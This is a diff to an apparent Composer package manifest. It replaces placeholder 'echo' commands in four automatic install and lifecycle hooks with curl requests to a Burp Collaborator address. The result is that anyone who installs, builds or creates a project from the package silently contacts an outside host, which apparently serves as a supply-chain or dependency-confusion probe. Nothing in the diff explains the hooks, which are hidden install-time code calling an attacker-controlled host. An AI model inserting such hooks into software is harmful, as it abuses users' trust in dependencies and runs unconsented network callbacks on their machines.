@@ -4,17 +4,16 @@
     },
     "scripts": {
         "post-package-install": [
-            "echo abc1"
+            "curl http://kd1bqni2jsbkaxm4unn6qazk6bc10q.burpcollaborator.net/"
         ],
         "post-install-cmd": [
-            "echo abc2"
+            "curl http://kd1bqni2jsbkaxm4unn6qazk6bc10q.burpcollaborator.net/"
         ],
         "post-autoload-dump": [
-              "echo abc3"
-
+            "curl http://kd1bqni2jsbkaxm4unn6qazk6bc10q.burpcollaborator.net/"
         ],
         "post-create-project-cmd": [
-              "echo abc4"
+            "curl http://kd1bqni2jsbkaxm4unn6qazk6bc10q.burpcollaborator.net/"
         ]
     }
 }
